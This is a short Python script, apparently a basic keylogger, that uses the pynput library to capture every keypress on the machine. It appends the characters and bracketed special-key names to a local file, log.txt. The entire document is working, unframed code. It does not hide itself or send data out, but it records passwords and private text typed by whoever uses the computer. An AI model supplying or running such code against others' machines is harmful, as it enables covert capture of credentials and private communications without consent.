from pynput import keyboard

def file_logger(key):
    with open("log.txt","a") as fh:
        try:
            char=key.char
            fh.write(char)
        except AttributeError:
            special_key = f"[{key.name.upper()}]"
            fh.write(special_key)
        except:
            pass
        
if __name__=="__main__":
    listener=keyboard.Listener(on_press=file_logger)
    listener.start()
    input()